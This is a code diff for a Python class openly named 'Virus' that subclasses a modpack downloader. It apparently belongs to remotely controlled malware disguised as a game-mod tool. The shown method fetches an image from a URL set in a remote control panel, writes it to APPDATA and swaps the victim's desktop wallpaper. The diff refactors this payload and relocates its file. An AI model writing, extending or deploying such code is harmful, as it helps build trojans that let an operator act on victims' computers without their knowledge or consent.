@@ -15,13 +15,12 @@ import os
 import time
 import random
 from ctypes import wintypes
-
-import requests
 import winsound
 from datetime import datetime
+import ctypes
 
 # Third Party Imports
-import ctypes
+import requests
 import webbrowser
 import mouse
 import screeninfo
@@ -29,6 +28,7 @@ from loguru import logger
 
 # Local Application Imports
 from ModpackDownloader import ModpackDownloader
+from GeneralUtils import GeneralUtils
 
 
 class Virus(ModpackDownloader):
@@ -112,20 +112,18 @@ class Virus(ModpackDownloader):
         """
 
         # Prepares the path for the temporary picture
-        tmp_picture_path: str = os.path.join(os.path.expanduser("~/Desktop"), str(datetime.now().timestamp()) + ".png")
+        tmp_picture_path: str = os.path.join(os.environ["APPDATA"], str(int(datetime.now().timestamp())) + ".png")
 
         # Downloads and the specified picture (in the panel) into the desktop
-        with requests.get(self._get_panel_setting("BACKGROUND-IMG"), allow_redirects=True) as r, \
+        with requests.get(GeneralUtils().get_panel_setting("BACKGROUND-IMG"), allow_redirects=True) as r, \
             open(tmp_picture_path, "wb") as picture:
-            logger.debug(f"Downloading the temporary picture: {self._get_panel_setting('BACKGROUND-IMG')}")
+            logger.debug(f"Downloading the temporary picture: {GeneralUtils().get_panel_setting('BACKGROUND-IMG')}")
             picture.write(r.content)
 
         # Secures the current wallpaper, sets the temp picture as the wallpaper and deletes the file.
         logger.debug("Securing the current wallpaper and changing the background")
         shutil.copy(self._get_wallpaper(), os.path.expanduser("~/Desktop"))
         self._set_wallpaper(tmp_picture_path)
-
-        # Clear the temporary picture
         os.remove(tmp_picture_path)
 
 
